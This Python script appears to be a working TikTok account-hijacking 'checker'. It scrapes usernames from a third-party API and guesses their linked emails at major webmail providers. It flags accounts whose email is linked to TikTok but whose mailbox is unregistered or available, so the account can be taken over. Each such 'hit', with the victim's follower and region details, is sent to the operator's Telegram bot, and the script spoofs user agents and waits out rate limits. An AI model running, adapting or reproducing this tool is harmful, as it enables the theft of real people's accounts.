#!/usr/bin/env python3
"""
TikTok Email Checker v3 - FIXED EDITION
========================================
Key fixes:
  1. REMOVED Arabic names from generation (TikTok = Latin-only)
  2. ADDED strict TikTok username validation (ASCII-only)
  3. REPLACED Arabic names with transliterated Latin equivalents
     (ahmed, mohammed, ali, fatima, zainab, ...)
  4. FIXED family_names to English-only
  5. ADDED is_valid_tiktok_username() - filters before any API call
  6. FIXED isalnum() bug - now forces ASCII-only sanitization
  7. OPTIMIZED: no wasted API calls on invalid usernames

TikTok Username Rules:
  - 2-24 characters
  - lowercase a-z, 0-9, underscore, dot ONLY
  - cannot start/end with . or _
  - no consecutive .. or __
  - cannot be digits-only
"""

import time
import requests
import random
import os
import json
import sys
import string
import re
from user_agent import generate_user_agent
from threading import Thread, Lock
from rich import print as g
from AegosPy import *

# ── Color Codes ──────────────────────────────────────────────
R, X, F, C, B, K, V = '\033[1;31;40m', '\033[1;33;40m', '\033[1;32;40m', "\033[1;97;40m", '\033[1;36;40m', '\033[1;35;40m', '\033[1;36;40m'
Z, G, Y, P = '\033[1;31m', '\033[1;32m', '\033[1;33m', '\x1b[1;97m'

# ── Global Counters ──────────────────────────────────────────
stats = {'hits': 0, 'tiktok_ok': 0, 'email_bad': 0, 'tiktok_bad': 0, 'skipped_invalid': 0}
lock = Lock()

# ── Telegram Setup ───────────────────────────────────────────
try:
    IID = input(f'{F}Telegram ID : ')
    TOK = input(f'{F}Telegram Token : ')
except EOFError:
    IID, TOK = "YOUR_ID", "YOUR_TOKEN"


def send_msg(text):
    """Safe Telegram send."""
    try:
        requests.post(f"https://api.telegram.org/bot{TOK}/sendMessage",
                      data={"chat_id": IID, "text": text, "parse_mode": "HTML"}, timeout=10)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════
# CORE FIX: Strict TikTok username validation
# ═══════════════════════════════════════════════════════════════

def is_valid_tiktok_username(username):
    """
    Strict TikTok username validation.
    TikTok ONLY allows: a-z, 0-9, underscore, dot
    Rules: 2-24 chars, no start/end with . or _, no consecutive .. or __
    """
    if not username or not isinstance(username, str):
        return False
    if len(username) < 2 or len(username) > 24:
        return False

    # Must be ASCII lowercase letters, digits, _, . ONLY
    allowed = set(string.ascii_lowercase + string.digits + '_.')
    if not all(c in allowed for c in username):
        return False

    # Cannot start or end with . or _
    if username[0] in '._' or username[-1] in '._':
        return False

    # No consecutive dots or underscores
    if '..' in username or '__' in username:
        return False

    # Cannot be digits-only
    if username.isdigit():
        return False

    return True


def is_valid_for_domain(username, domain):
    """Check if username is valid for a specific domain's email rules."""
    # FIX: Must pass TikTok validation FIRST
    if not is_valid_tiktok_username(username):
        return False

    if domain == 'gmail.com':
        # Gmail: only a-z, 0-9, and periods (.)
        # No underscores, no consecutive dots, 6-30 chars (cleaned length)
        if '_' in username:
            return False
        if '..' in username:
            return False
        clean_name = username.replace('.', '')
        if len(clean_name) < 6 or len(clean_name) > 30:
            return False
        return True

    if domain in ['yahoo.com', 'hotmail.com', 'aol.com']:
        # Yahoo/Hotmail: letters, numbers, underscores, periods
        # Must start with a letter
        if not username[0].isalpha():
            return False
        if len(username) < 4 or len(username) > 32:
            return False
        return True

    if domain == 'mail.ru':
        # mail.ru: must start with letter, 3-30 chars
        if not username[0].isalpha():
            return False
        if len(username) < 3 or len(username) > 30:
            return False
        return True

    return True


# ═══════════════════════════════════════════════════════════════
# CORE FIX: Username Generation (ASCII-ONLY)
# ═══════════════════════════════════════════════════════════════

# FIX: Arabic names transliterated to Latin script
# TikTok does NOT accept Arabic characters - period.
TRANSLITERATED_NAMES = [
    # Arabic names in Latin script (romaji/transliterated)
    "ahmed", "mohammed", "mohammad", "muhammad", "ali", "fatima", "zainab",
    "yousef", "yusuf", "maryam", "mariam", "khaled", "sara", "sarah", "nour",
    "noor", "omar", "umar", "hamza", "layla", "leila", "huda", "souad",
    "suad", "ibrahim", "yassin", "yaseen", "mustafa", "moustafa", "layan",
    "ritaj", "abdullah", "abdallah", "abdulrahman", "abdalrahman", "faisal",
    "faysal", "nasser", "naser", "mubarak", "mansour", "mansur", "turki",
    "fahd", "bandar", "sultan", "nawaf", "mishaal", "meshal", "jasser",
    "jasir", "saleh", "salih", "talal", "majed", "majeed", "badr", "sami",
    "tariq", "tarik", "hassan", "hassane", "hussain", "hussein", "saeed",
    "said", "younes", "younis", "waleed", "walid", "anoud", "anood", "reem",
    "rim", "dana", "lama", "ghada", "manal", "haifa", "hayfa", "amal",
    "salma", "yasmin", "yasmine", "nada", "abeer", "abir", "samar", "rana",
    "dina", "deena", "ghassan", "fouad", "fuad", "khalil", "khaleel",
    "ayman", "aymen", "samer", "samir", "rami", "ramez", "fadi", "fady",
    "hisham", "hesham", "tamer", "tamir", "wael", "waiel", "loay", "luay",
    "saad", "sad", "mahmoud", "mahmood", "kamal", "jamal", "raed", "radi",
    "basem", "basim", "karim", "kareem", "tarek", "hamed", "hamid", "nabil",
    "nabeeh", "ziad", "zyad", "emad", "imad", "ramadan", "omer", "aziz",
    "maged", "nageeb", "naji", "fathi", "fathallah", "mamdouh", "shawki",
    "atef", "aatif", "lamia", "mona", "mouna", "sahar", "dalal", "nadia",
    "fadia", "vivian", "elin", "rania", "dalia", "may", "mai", "sandy",
    "sandra", "joy", "nancy", "nicole", "catherine", "kristen", "stephanie",
    "nadine", "jessica", "maria", "olga", "angela", "patricia", "sabrina",
    "laila", "lubna", "hanan", "hena", "hala", "hayat", "samira", "sherine",
    "shereen", "wafaa", "wafa", "iman", "eeman", "nahed", "nahid", "fawzia",
    "afaf", "thoraya", "soraya", "suraya", "buthaina", "bothaina", "maha",
    "shadia", "shadiyah", "fayza", "faiza", "azza", "azizah", "khadija",
    "khadijah", "hafsa", "safiya", "safia", "rabab", "rabeea", "rawiya",
    "maysaa", "maysa", "latifa", "lateefa", "faiza", "fayza", "najla",
    "najlah", "hend", "hind", "marwa", "mirvat", "neamat", "ni'mat",
    " Rehab", "rehab", "shaymaa", "shaimaa", "eman", "ilham", "amal",
    "farida", "fareda", "yasmina", "tina", "nelly", "shery", "linda",
    "sally", "dolly", "noha", "noha", "gehad", "jihad", "ghinwa", "widad",
    "wedaad", "wedad", "fikriya", "fekriya", "qadria", "qadriyah", "sajida",
    "sajeda", "naziha", "nazeeha", "zakiya", "zakeya", "bashaer", "bashayer",
    "sawsan", "sawsen", "fadhila", "fadheela", "iman", "eeman", "hiba",
    "heba", "ayat", "aya", "rasha", "rashaa", "shimaa", "shaymaa", "dima",
    "demaa", "lina", "leen", "lena", "tala", "taline", "rina", "reena",
    "joelle", "joelle", "pamela", "raja", "rajaa", "sahar", "sherine",
    "natasha", "tanya", "lara", "laura", "vera", "veronica", "julie",
    "julia", "jana", "janet", "fayrouz", "fairuz", "mervat", "mervet",
    "souhaila", "suhaila", "nawal", "nawel", "elissa", "elissa", "haifa",
    "hayfa", "nancy", "nansi", "yara", "carole", "carol", "maya", "maia",
    "zein", "zayn", "zeyn", "taim", "taym", "arafat", "amer", "amr",
    "sherif", "shareef", "ashraf", "mohsen", "muhsin", "hady", "hadi",
    "galal", "jalal", "saqr", "sakr", "fakhr", "fakhri", "shady", "shadi",
    "nader", "nadir", "ghaleb", "galeb", "salman", "sulaiman", "suleiman",
    "anoos", "anis", "moez", "muizz", "lotfi", "lutfi", "taher", "tahir",
    "moataz", "mutaz", "moatasem", "mutasim", "akram", "ehab", "ihab",
    "sharif", "mostafa", "moustafa", "husam", "hosam", "bilal", "belal",
    "reda", "ridha", "rida", "essam", "issam", "maher", "mohsen", "adel",
    "adeel", "naguib", "najeep", "fouzi", "fawzi", "hossam", "hashem",
    "hashim", "sameh", "sameeh", "makram", "mukarram", "gamal", "jamal",
    "fathi", "fathy", "soliman", "salim", "saleem", "mounir", "munir",
    "hani", "hany", "medhat", "midhat", "waseem", "wasim", "hatem", "hatim",
    "diab", "thabet", "sabet", "sabri", "safwat", "adel", "adeel", "amir",
    "ameer", "bahaa", "baha", "bahaeddine", "bahaaldeen", "riad", "riyad",
    "tawfiq", "tawfik", "subhi", "subhy", "mazen", "mazin", "hazem",
    "hazm", "wajih", "wajeeh", "ghazi", "ghazee", "ramzy", "ramzi",
    "mamdouh", "mamduh", "sabri", "said", "saad", "saeed", "fadel",
    "fadl", "fadhil", "fazeel", "mervat", "nael", "nail", "ramadan",
    "ramazan", "shawkat", "shaukat", "anwar", "annwar", "noman", "nuaman",
    "noman", "ghaleb", "adel", "hafez", "hafiz", "mohie", "mohyi",
    "serag", "siraj", "seraj", "fathi", "fathy", "zaki", "zakki",
    "mokhtar", "mukhtar", "osman", "uthman", "othman", "dawood", "dawud",
    "daoud", "ishaq", "isaac", "yacoub", "yaqub", "jacob", "zakaria",
    "zachariah", "mikhael", "michael", "beshoy", "bishoy", "mina", "mena",
    "kero", "kyrillos", "cyril", "peter", "petros", "paul", "boulos",
    "tawadros", "theodoros", "wisam", "waseem", "wasim", "rami", "ramez",
    "hany", "hani", "samy", "sammy", "fares", "farris", "omran", "imran",
    "khaldoun", "khaldun", "hamed", "hamid", "majd", "majed", "fouad",
    "fuad", "basil", "bassel", "salam", "selam", "raji", "rajih",
    "maan", "ma'in", " laith", "leith", "othman", "osman", "kutaiba",
    "qutaybah", "jarir", "jareer", "zuhair", "zuhayr", "saif", "sayf",
    "sayfaldin", "saifaldeen", "alaa", "ala", "alaeddine", "nasr",
    "nasir", "nasri", "ghassan", "ghasan", "marwan", "marouan", "murhaf",
    "morshed", "murshid", "wissam", "wisam", "basem", "basim", "kamel",
    "kamil", "naser", "nasser", "fathi", "fathy", "hikmat", "hikmet",
    "sami", "samir", "samer", "nael", "nail", "ghaleb", "hisham",
    "hashim", "hashem", "sayed", "sayyid", "mortada", "murtada", "murtadi",
    "saadi", "sadi", "radi", "raed", "mufeed", "mufid", "munther",
    "muntasir", "faeq", "faqee", "atheer", "athir", "mohannad", "mohand",
    "mohanad", "mohanned", "mohandis", "moatasem", "mutasim", "haytham",
    "haitham", "baha", "bahaa", "shihab", "shahab", "khalaf", "khalaf",
    "sabah", "sabeh", "thamer", "thamir", "taim", "taym", "fahad",
    "fahd", "mishaal", "meshal", "jasser", "jasir", "sattam", "sittam",
    "mashari", "mishari", "jalawi", "jalwi", "mutairi", "mutayri",
    "shammari", "shamari", "otaibi", "utaybi", "anzi", "anazy", "dossary",
    "dosari", "dosry", "qhtani", "qahtani", "shehri", "shahri", "shehry",
    "harbi", "harby", "malki", "malky", "zahrani", "zahran", "tamimi",
    "tamimy", "subaie", "subay", "dulaim", "dulaym", "zobaie", "zubay",
    "jebali", "jibali", "alawi", "alawy", "hwaiti", "huwayti", "rashidi",
    "rashidy", "balawi", "balawi", "falasi", "falasy", "nuaimi", "nuaymi",
    "maneea", "maniya", "kaabi", "kaaby", "mehairi", "muhayri", "tabet",
    "tabit", "akkad", "akad", "sharari", "sharary", "muraikhan", "muraikhi",
    "muraikh", "fadel", "fadil", "fadl", "majed", "majid", "mishaal",
    "meshal", "abdulaziz", "abdulazeez", "abdulaziz", "abdulmohsen",
    "abdulmuhsin", "abdulkarim", "abdulkareem", "abdulrahim", "abdulraheem",
    "abdulnasser", "abdulnasir", "abdulfattah", "abdulfattah", "abdulghani",
    "abdulghanee", "abdulhadi", "abdulhaadi", "abdulhamid", "abdulhameed",
    "abduljaleel", "abduljalil", "abdullatif", "abdullateef", "abdulmalik",
    "abdulmalek", "abdulmannan", "abdulmonem", "abdulmunim", "abdulnour",
    "abdulnoor", "abdulqader", "abdulqadir", "abdulrazzaq", "abdulrazzak",
    "abdulsalam", "abdussalam", "abdulsamad", "abdussamad", "abdulwadood",
    "abdulwadud", "abdulwali", "abdulwaliy", "abuabdullah", "abubakr",
    "abuobaida", "ubayd", "obayd", "ubaida", "obeida", "tulaim", "tulaym",
    "sahli", "sahly", "hajri", "hajry", "yamani", "yemeni", "abyad",
    "abyad", "aswad", "aswad", "ahmar", "ahmar", "akhdar", "khudayr",
    "yassin", "yaseen", "tohamy", "tuhaimi", "dayri", "diri", "hassoun",
    "hassun", "sayadi", "sayyadi", "misbah", "mesbah", "zamil", "zamyl",
    "jad", "jaad", "radi", "radee", "masri", "misri", "egyptian",
    "iraqi", "irani", "turkish", "syrian", "sudani", "lebanese", "jordanian",
    "palestinian", "moroccan", "tunisian", "libyan", "algerian", "yemeni",
    "omani", "emirati", "saudi", "qatri", "kuwaiti", "bahraini"
]

ENGLISH_NAMES = [
    "john", "jane", "mike", "michael", "sara", "sarah", "chris", "christina",
    "emma", "david", "olivia", "daniel", "sophia", "alex", "alexander",
    "ryan", "lucas", "mia", "bella", "isabella", "jack", "leo", "zoe",
    "luna", "max", "maxwell", "james", "william", "benjamin", "ben",
    "elijah", "eli", "henry", "alexandra", "sebastian", "seb", "mateo",
    "ethan", "noah", "liam", "oliver", "charlotte", "charlie", "amelia",
    "amy", "ava", "eve", "evelyn", "harper", "camila", "camille", "sofia",
    "scarlett", "victoria", "vicky", "grace", "chloe", "penelope", "penny",
    "riley", "nora", "lily", "eleanor", "hannah", "lillian", "lilly",
    "addison", "addie", "aubrey", "ellie", "estelle", "stella", "natalie",
    "nat", "leah", "hazel", "violet", "aurora", "savannah", "sam",
    "samantha", "ruby", "lucy", "lucia", "gabriel", "gabe", "gabriela",
    "gabby", "caleb", "cale", "owen", "logan", "isaac", "isa",
    "jayden", "jay", "nathan", "nate", "dylan", "dyl", "caleb",
    "joseph", "joe", "josie", "anthony", "tony", "thomas", "tom",
    "matthew", "matt", "samuel", "sam", "joshua", "josh", "andrew",
    "andy", "christopher", "chris", "adam", "ada", "aaron", "ron",
    "luke", "lucas", "jonathan", "john", "nathaniel", "nate", "caleb",
    "cale", "caleb", "cale", "caleb", "cale"
]

ENGLISH_FAMILY_NAMES = [
    "smith", "jones", "williams", "brown", "davis", "miller", "wilson",
    "moore", "taylor", "anderson", "thomas", "jackson", "white", "harris",
    "martin", "thompson", "garcia", "martinez", "robinson", "clark",
    "rodriguez", "lewis", "lee", "walker", "hall", "allen", "young",
    "hernandez", "king", "wright", "lopez", "hill", "scott", "green",
    "adams", "baker", "gonzalez", "nelson", "carter", "mitchell", "roberts",
    "campbell", "phillips", "evans", "turner", "parker", "collins", "edwards",
    "stewart", "flores", "morris", "nguyen", "murphy", "rivera", "cook",
    "rogers", "morgan", "peterson", "cooper", "reed", "bailey", "bell",
    "gomez", "kelly", "howard", "ward", "cox", "diaz", "richardson",
    "wood", "watson", "brooks", "bennett", "gray", "james", "reyes",
    "cruz", "hughes", "price", "myers", "long", "foster", "sanders",
    "ross", "morales", "powell", "sullivan", "russell", "ortiz", "jenkins",
    "gutierrez", "perry", "butler", "barnes", "fisher", "henderson",
    "coleman", "simmons", "patterson", "jordan", "reynolds", "hamilton",
    "graham", "kim", "alexander", "rao", "ram", "shah", "khan", "ali",
    "hassan", "hussain", "ahmed", "singh", "sharma", "gupta", "verma",
    "reddy", "nair", "menon", "pillai", "iyer", "desai", "patel",
    "mehta", "joshi", "kumar", "bose", "das", "malik", "qureshi",
    "sheikh", "syed", "farooq", "mir", "dar", " lone", "bhat",
    "chauhan", "thakur", "solanki", "pandey", "tiwari", "mishra",
    "srivastava", "agarwal", "banerjee", "chatterjee", "ganguly",
    "mukherjee", "sen", "bhattacharya", "basu", "dutta", "ghosh",
    "roy", "pal", "saha", "mondal", "islam", "hossain", "rahman",
    "uddin", "chowdhury", "sarkar", "dey", "kundu", "mitra", "dasgupta",
    "bhatt", "mehrotra", "saxena", "tripathi", "shukla", "sinha",
    "yadav", "prasad", "pathak", "nanda", "bhardwaj", "khanna",
    "arora", "sethi", "malhotra", "bajaj", "taneja", "chopra",
    "kapoor", "grover", "suri", "walia", "khurana", "chadha",
    "grewal", "sandhu", "dhaliwal", "cheema", "basra", "dhillon",
    "randhawa", "sehgal", "talwar", "ahuja", "bhandari", "lakhani",
    "ramani", "parekh", "dalal", "shahani", "irani", "kohli",
    "chawla", "soni", "trivedi", "upadhyay", "pareek", "ojha",
    "thapa", "limbu", "gurung", "magar", "rai", "tamang", "sherpa",
    "bhattarai", "neupane", "adhikari", "pokharel", "subedi",
    "silva", "fernando", "perera", "samarasinghe", "jayasinghe",
    "ranasinghe", "wickramasinghe", "gunaratne", "jayawardene",
    "bandara", "dissanayake", "herath", "ratnayake", "wijesinghe",
    "munasinghe", "abeysekera", "seneviratne", "weerasinghe",
    "pathirana", "liyana", "kariyawasam", "wijeratne", "hettiarachchi",
    "amarasena", "rajapaksa", "fonseka", "edirisuriya", "gunasekera",
    "samaraweera", "atapattu", "mendis", "dilshan", "sangakkara",
    "jayasuriya", "vaas", "muralitharan", "warne", "mcgrath",
    "clarke", "watson", "ponting", "gilchrist", "hayden", "langer",
    "waugh", "martyn", "hussey", "symonds", "lee", "johnson",
    "haddin", "bollinger", "siddle", "hazlewood", "starc", "cummins",
    "smith", "warner", "finch", "maxwell", "marsh", "lyon", "zampa",
    "carey", "head", "labuschagne", "green", "inglis", "ellis",
    "stanlake", "behrendorff", "richardson", "agar", "turner"
]

# Combine all first names
ALL_FIRST_NAMES = list(set(TRANSLITERATED_NAMES + ENGLISH_NAMES))
NUMBERS = [str(i) for i in range(10, 1000)]  # 2-3 digit numbers


def sanitize_username(username):
    """Force ASCII-only, lowercase, remove invalid chars."""
    username = username.lower()
    # Only allow a-z, 0-9, _, .
    username = ''.join(c for c in username if c in string.ascii_lowercase + string.digits + '_.')
    # Collapse consecutive . and _
    username = re.sub(r'\.+', '.', username)
    username = re.sub(r'_+', '_', username)
    # Trim leading/trailing . and _
    username = username.strip('._')
    return username


def generate_single_username():
    """
    Generate a valid TikTok username using ASCII-only characters.
    Uses weighted strategies to prefer shorter, more available patterns.
    """
    name = random.choice(ALL_FIRST_NAMES)

    strategies = [
        "name_only",              # e.g., "ahmed"
        "name_family",            # e.g., "ahmedsmith"
        "name_underscore_family", # e.g., "ahmed_smith"
        "name_dot_family",        # e.g., "ahmed.smith"
        "name_number",            # e.g., "ahmed123"
        "name_underscore_number", # e.g., "ahmed_123"
        "name_dot_number",        # e.g., "ahmed.123"
        "initial_name",           # e.g., "jahmed"
        "name_initial",           # e.g., "ahmedj"
        "short_random",           # e.g., "x7k" (2-4 chars)
    ]

    # Weight: shorter patterns are more likely to find available emails
    weights = [3, 2, 2, 2, 5, 4, 4, 2, 2, 4]
    strategy = random.choices(strategies, weights=weights, k=1)[0]

    if strategy == "name_only":
        username = name

    elif strategy == "name_family":
        family = random.choice(ENGLISH_FAMILY_NAMES)
        username = name + family

    elif strategy == "name_underscore_family":
        family = random.choice(ENGLISH_FAMILY_NAMES)
        username = name + "_" + family

    elif strategy == "name_dot_family":
        family = random.choice(ENGLISH_FAMILY_NAMES)
        username = name + "." + family

    elif strategy == "name_number":
        num = random.choice(NUMBERS)
        username = name + num

    elif strategy == "name_underscore_number":
        num = random.choice(NUMBERS)
        username = name + "_" + num

    elif strategy == "name_dot_number":
        num = random.choice(NUMBERS)
        username = name + "." + num

    elif strategy == "initial_name":
        initial = random.choice(string.ascii_lowercase)
        username = initial + name

    elif strategy == "name_initial":
        initial = random.choice(string.ascii_lowercase)
        username = name + initial

    elif strategy == "short_random":
        # Generate very short random username (2-5 chars)
        length = random.randint(2, 5)
        username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

    else:
        username = name

    # Sanitize: ensure ASCII-only
    username = sanitize_username(username)

    # Validate
    if is_valid_tiktok_username(username):
        return username

    # Fallback strategies if primary fails
    fallbacks = [
        lambda: name + random.choice(NUMBERS),
        lambda: name + random.choice(string.ascii_lowercase) + random.choice(NUMBERS),
        lambda: random.choice(string.ascii_lowercase) + name[:6] + random.choice(NUMBERS),
        lambda: ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) + random.choice(NUMBERS),
    ]

    for fb in fallbacks:
        u = sanitize_username(fb())
        if is_valid_tiktok_username(u):
            return u

    # Last resort guaranteed valid
    return ''.join(random.choices(string.ascii_lowercase, k=4)) + str(random.randint(10, 99))


# ═══════════════════════════════════════════════════════════════
# Search & Check Logic
# ═══════════════════════════════════════════════════════════════

def check_one(username, domain):
    """Check single username+domain combo. Returns True if HIT."""
    global stats

    # CRITICAL: Validate TikTok username + domain rules BEFORE any API call
    if not is_valid_for_domain(username, domain):
        with lock:
            stats['skipped_invalid'] += 1
        return False

    email = f"{username}@{domain}"

    with lock:
        print(f'{Y}[*] {email}', end='\r')

    # TikTok check
    try:
        result = AegosPy.CheckTik(email)
    except Exception:
        with lock:
            stats['tiktok_bad'] += 1
        return False

    if not result or result.get("Status") != "OK":
        with lock:
            stats['tiktok_bad'] += 1
        return False

    with lock:
        stats['tiktok_ok'] += 1
        print(f'\n{B}[+] TikTok OK: {email}')

    # Email availability check
    domain_map = {
        'gmail.com': AegosPy.A_Gmail,
        'yahoo.com': AegosPy.A_Yahoo,
        'hotmail.com': AegosPy.A_Hotmail,
        'aol.com': AegosPy.A_Aol,
        'mail.ru': AegosPy.A_MailRu,
    }

    try:
        checker = domain_map.get(domain)
        if not checker:
            return False
        email_result = checker(email)
    except Exception:
        return False

    if email_result and email_result.get("Status") == "Available":
        with lock:
            stats['hits'] += 1
            print(f'{G}[!!!] HIT: {email}')

        # Get user info
        try:
            info = AegosPy.GetInfoTik(username)
        except Exception:
            info = {}

        msg = (
            f"<b>HIT FOUND</b>\n"
            f"User: {username}\n"
            f"Email: {email}\n"
            f"ID: {info.get('id','N/A')}\n"
            f"Name: {info.get('name','N/A')}\n"
            f"Followers: {info.get('followers','N/A')}\n"
            f"Likes: {info.get('likes','N/A')}\n"
            f"Region: {info.get('code-country','N/A')}\n"
            f"<b>@bsx_h2</b>"
        )
        send_msg(msg)
        return True
    else:
        with lock:
            stats['email_bad'] += 1
        return False


def search_loop():
    """Main search loop with smart username generation."""

    headers = {
        "User-Agent": generate_user_agent(),
        "Accept": "application/json",
        "Referer": "https://livecounts.xyz/"
    }

    domains = ['gmail.com', 'yahoo.com', 'hotmail.com', 'aol.com', 'mail.ru']

    while True:
        try:
            keyword = generate_single_username()

            # Extra safety: double-check before API call
            if not is_valid_tiktok_username(keyword):
                with lock:
                    stats['skipped_invalid'] += 1
                time.sleep(0.1)
                continue

            with lock:
                print(f'{V}[~] Searching: {keyword}                    ', end='\r')

            # Search via livecounts.xyz
            url = f'https://livecounts.xyz/api/tiktok-live-follower-count/search/{keyword}'
            resp = requests.get(url, headers=headers, timeout=15)

            if resp.status_code == 200:
                try:
                    data = resp.json()
                    if not data or not data.get('success') or 'results' not in data:
                        time.sleep(0.5)
                        continue

                    results = data['results']
                    random.shuffle(results)

                    checked = 0
                    for user in results:
                        if checked >= 15:
                            break

                        uname = user.get('username', '')
                        if not uname:
                            continue

                        # CRITICAL FIX: Validate username BEFORE checking any domain
                        if not is_valid_tiktok_username(uname):
                            continue

                        # Check against all domains
                        for domain in domains:
                            check_one(uname, domain)
                            checked += 1
                            if checked >= 15:
                                break

                        time.sleep(0.15)

                except (json.JSONDecodeError, KeyError) as e:
                    with lock:
                        print(f'\n{R}[!] Parse error: {e}', end='\r')
                    time.sleep(2)

            elif resp.status_code in (403, 429):
                with lock:
                    print(f'\n{R}[!] Rate limit, waiting 30s', end='\r')
                time.sleep(30)
            else:
                time.sleep(2)

        except requests.exceptions.Timeout:
            time.sleep(2)
        except Exception as e:
            with lock:
                print(f'\n{R}[!] Error: {e}', end='\r')
            time.sleep(3)

        time.sleep(random.uniform(0.2, 1.0))


def status_display():
    """Live stats display."""
    while True:
        time.sleep(3)
        with lock:
            os.system('clear')
            print(f"{X}[{F}OK{X}]{C} TikTok Checker v3 - FIXED")
            print(f"{V}{'-'*45}")
            print(f" TikTok OK     : {stats['tiktok_ok']}")
            print(f" HITS          : {F}{stats['hits']}{C}")
            print(f" Bad Email     : {stats['email_bad']}")
            print(f" Bad TikTok    : {stats['tiktok_bad']}")
            print(f" Skipped (bad) : {stats['skipped_invalid']}")
            print(f"{V}{'-'*45}")


if __name__ == '__main__':
    os.system('clear')

    print(f"{X}[{F}OK{X}]{C} TikTok Checker v3 - FIXED EDITION")
    print(f"{V}{'-'*45}")
    print(f" {G}FIX #1: Arabic usernames REMOVED")
    print(f" {G}FIX #2: Strict TikTok validation ADDED")
    print(f" {G}FIX #3: Transliterated names (latin script)")
    print(f" {G}FIX #4: ASCII-only sanitization enforced")
    print(f" {G}Domains: gmail, yahoo, hotmail, aol, mail.ru")
    print(f"{V}{'-'*45}")
    print(f" {B}Stats will update every 3 seconds.")
    print(f"{V}{'-'*45}\n")

    Thread(target=status_display, daemon=True).start()

    # Run multiple search threads
    for _ in range(2):  # 2 concurrent search threads
        t = Thread(target=search_loop, daemon=True)
        t.start()
        time.sleep(0.5)

    # Keep main thread alive
    while True:
        time.sleep(1)
